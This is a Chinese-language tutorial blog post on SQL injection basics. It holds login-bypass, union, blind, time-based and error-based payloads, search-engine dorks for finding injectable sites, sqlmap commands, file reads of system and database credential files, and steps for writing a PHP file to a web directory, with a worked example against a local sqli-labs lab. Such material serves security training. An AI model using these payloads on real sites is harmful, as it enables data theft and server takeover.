---
layout: post
title: "1.sql注入基础"
date: 2018-10-11
category: web安全
tags: web安全 sql注入
---

## 目录
<!-- MarkdownTOC -->

- SQL注入原理
	- SQL注入原理-SQL注入产生原因
	- SQL注入原理-SQL注入核心原理
- SQL注入的危害
- mysql注入语句
	- mysql注入语句-mysql介绍
	- mysql注入语句-万能密码
	- mysql注入语句-注入语句例子
- sql注入流程
- MySQL手工注入方法
- TIPS
- 实例
- 相关链接

<!-- /MarkdownTOC -->


## SQL注入原理

### SQL注入原理-SQL注入产生原因

>基于B/S架构的网络上，对安全控制能力较弱，然后开发人员水平和经验参差不齐，没有对用户输入数据，或者对页面中携带的信息进行必要的判断。攻击者利用这个机会提交一段数据库查询代码，可以获得一些数据库信息。

### SQL注入原理-SQL注入核心原理

>SQL注入是一种将恶意的SQL代码插入到用户的输入参数中的攻击，攻击者探测出开发者编程过程中的漏洞，利用漏洞，巧妙的构造SQL语句，对数据库的内容进行检索或修改。

> 简单概括：利用现有应用程序，将精心构造的SQL语句“注入”到后台数据库所执行的恶意操作

---

> 灵活的SQL查询语句+用户输入的数据带入可执行SQL语句=用户直接操作数据库->SQL注入漏洞

## SQL注入的危害

- 数据库信息泄露：数据库中存放的用户的隐私信息的泄漏。
- 网页篡改：通过操作数据库对特定网页进行篡改。
- 网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。
- 数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员账户被篡改。
- 服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。
- 破坏硬盘数据，瘫痪全系统


## mysql注入语句
### mysql注入语句-mysql介绍

> MySQL是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL 是最流行的关系型数据库管理系统之一，在 WEB 应用方面，MySQL是最好的 RDBMS (Relational Database Management System，关系数据库管理系统) 应用软件。
> MySQL是一种关系数据库管理系统，关系数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。
> MySQL所使用的 SQL 语言是用于访问数据库的最常用标准化语言。MySQL 软件采用了双授权政策，分为社区版和商业版，由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，一般中小型网站的开发都选择 MySQL 作为网站数据库。

-- 摘自百度百科  


### mysql注入语句-万能密码

	# 登录处正常的SQL语句：
	select * from users where username= 'admin' and pwd = 'pass';

	# 万能密码：
	'or '1' = '1 

	# 带入用户输入参数
	select * from users where username= ''or '1' = '1' and pwd = ''or '1' = '1';

	第一个 or 前面为 false 后面为 true -> true
	and 前面为 true 后面为 false -> false
	第二个 or 前面为 false 后面为 true -> true

### mysql注入语句-注入语句例子

	# 利用构造1=2错误执行union后面的语句
	and 1=2 union select 1,2,3--

	# 利用mysql正则表达式为匹配当前用户是否为ro开头
	select user() regexp '^ro'

	# 查询当前用户的ascii码是否为114（r）
	ascii(substr(substr(select user()),1,1))=114

	# 如果当前用户的ascii码为114（r） 就返回0 否则就睡5秒
	if(ascii(substr((select user()),1,1))=114,0,sleep(5))

	# 查询第一个表名的ascii码是否为99（c） 是返回1 否返回0
	(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=99)

	# 利用updatexml报错，返回版本信息
	updatexml(1,concat(0x7e,(select @@version),0x7e),1)


## sql注入流程

1. **目标搜集：**  
	无特定目标：  

		inurl:php?id=

	有特定目标：  

		inurl:php?id= site:target.com

	工具爬取：  

		spider，对搜索引擎和目标网站的链接进行爬取

2. **注入识别：**  
	手工简单识别：  

		'
		and 1=1 / and 1=2
		and '1' ='1 / and '1'='2
		and 1 like 1 / and 1 like 2

	工具识别：  

		sqlmap -m filename (filename中保存检测目标)
		sqlmap --crawl (sqlmap对网站进行爬取，然后依次进行测试)


3. **高级识别：**  

	扩展识别广度和深度：  

		sqlmap --level 增加测试级别，对header中相关参数也进行测试
		sqlmap -r filename(filename中为网站请求数据)

	利用工具提高识别效率：  

		BurpSuite + SqlMap

	Tips:  

		可以在参数后键入 “*” 来确定想要测试的参数  
		可能出现注入的点：新闻、登录、搜索、留言......  
		站在开发的角度去寻找  

4. **代码审计：**  

	搜索关键代码和函数  

		关键代码包括 $_GET/$_POST/$id/select/SELECT

	梳理业务流程  


## MySQL手工注入方法

**MySQL数据库结构**  

- Mysql
	- 连接层
		- 通信协议
		- 线程
		- 验证
	- SQL层
		- 解析器
		- 授权
		- 优化器
		- 查询执行
		- 查询高速缓存
		- 查询日志记录

**SQL层的功能**	  

1. 判断语法、语句、语义
2. 数据库对象授权情况判断，授权失败不继续
3. 解析（解析器）：将sql语句解析成执行计划，运行执行计划，生成找数据的方式
4. 优化（优化器）：运行执行计划，基于算法，从执行计划中选择代价最小的交给“执行器”
5. 执行（执行器）：运行执行计划，最终生产如何去磁盘找数据方式
6. 将取数据的方式，交由下层（存储引擎层）进行处理
7. 最终将取出的数据抽象成管理员或用户能看懂的方式（表），展现在用户面前
8. 查询缓存：缓存之前查询的数据

**MySQL内置库（>=5.7）**  

mysql: 账户信息、权限信息、存储过程、event、时区等信息。  

sys: 存储过程、自定义函数、视图帮助我们快速的了解系统的元数据信息。（元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等）  

performance_schema: 用于收集数据库服务器性能参数  

information_schema: 访问数据库元数据的方式，保存关于MySQL服务器所维护的所有其他数据库信息，如数据库名，数据库表，表的数据类型与访问权限等。

**查询数据核心语法**  

	# 查库
	select schema_name from information_schema.schemata;

	#查表
	select table_name from information_schema.tables where table_schema=库名;

	#查列
	select column_name from information_schema.columns where table_name=表名;

	#查数据
	select 列名 from 库名.表名;

**Tips**  

提示1: 所有类型的sql注入，都是基于查库、表、列语句  
提示2: 如果数据太多，导致无法返回查询结果：  
	查询的场景：可利用limit限定返回数量及为止，依次查询  
	`select username,password from security.users limit 0,1;`  
	回显数据的场景：* concat * 链接多个数据成为一条返回结果  
	`select group_concat(schema_name) from infromation_schema.schemata;`  
提示3: 在一些场景，想要快速获取数据，需要借助工具，如：BurpSuite  

**sql注入流程**  

[思维导图](http://naotu.baidu.com/file/18232e9bd73bf191df5d048930c001bf?token=86fd9c0a184789f3)  

- SQL注入
	- 信息搜集
		- 数据库类型
			- 报错信息 
			- 特有语句（不同数据库版本）
		- 数据库版本
		- 数据库用户
		- 判断数据库权限
	- 数据获取
		- 获取库信息
			- 获取当前库
			- 获取所有库
		- 获取表信息
		- 获取列信息
		- 获取数据
	- 提权
		- 根据数据库权限
			- 执行系统命令
				- 直接提权（
					- mssql：调用xp.cmdshell执行系统命令、
					- mysql：写木马到网站目录、
					- sqlmap  `--os-shell（os shell会上传两个文件一个木马  一个是创建文件 富于这个文件775的权限控制权限））`
			- 读文件
				- 读数据库配置文件,尝试远程连接
				- 读系统配置文件，搜集信息
					- `select load_file('/etc/password')`
			- 写文件
				- 写webshell到网站目录 
					- outfile (需要绝对路径) `（格式： select * into outfile "文件地址" 示例：select * info outfile 'f:/mysql/test/one' form teacher_class; ）`

## TIPS

mysql写shell
>1.需要知道绝对路径(web下层目录)
>2.用户需要file权限(root可写)，一般用户不会有file权限
>3.文件大小小于max_allow_upload
>4.secure_file_priv 指定可写目录

写
	
	select '<?php phpinfo();?>' into outfile 'c://php//www//kkk.php';
	select '<?php phpinfo();?>' into dumpfile 'c://php//www//kkk2.php';
	select * from user into outfile 'c://php//www/kkk4.php' fields terminated by '<?php phpinfo();?>'

---

## 实例

tips:  
> 查询数据的时候把信息记录到txt上

	# 判断是否存在sql注入 
	http://127.0.0.1/Less-1/?id=2' 
	http://127.0.0.1/Less-1/?id=2' and '1'=2

	# 判断列数
	http://127.0.0.1/Less-1/?id=2' order by 3--+

	# 判断输出信息位置 (union之前要报错才会查询union后面的)
	http://127.0.0.1/Less-1/?id=99999' union select 1,2,3--+

	# 查库名
	http://127.0.0.1/Less-1/?id=' union select 1,2,（select group_concat(schema_name) from information_schema.schemata--+

	# 查表名 'security'/十六进制0x/database()
	http://127.0.0.1/Less-1/?id=' union select 1,2,（select group_concat(table_name) from information_schema.tables where table_schema='security'--+

	# 查数据 group_concat/concat_ws
	http://127.0.0.1/Less-1/?id=' union select 1,2,（select group_concat(username,0x7e,password) from security.users)--+

	# 查权限
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select user())--+ 

	> root@localhost 

	#  读文件 db-creds.inc 数据库配置文件
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select load_file('/var/www/html/sql-connections/db-creds.inc'))--+ 



## 相关链接

[mysql官网](https://www.mysql.com/)  
[mysql内置函数](https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.html)    
[ascii对照表](http://ascii.911cha.com/)  
[mysql正则](http://www.runoob.com/mysql/mysql-regexp.html)  
[MYSQL updatexml报错注入](https://blog.csdn.net/vspiders/article/details/77430024)  
[Python Spider 的总结](https://blog.csdn.net/i_peter/article/details/53380334)  
[MySQL手工注入步骤+直接写入一句话](https://blog.csdn.net/hxsstar/article/details/19337461)  
[Mysql通过命令授于用户数据库操作权限](https://blog.csdn.net/m2417599488/article/details/72236666)  
[mysql 函数执行权限](https://blog.csdn.net/zhaoyangjian724/article/details/52121193)  


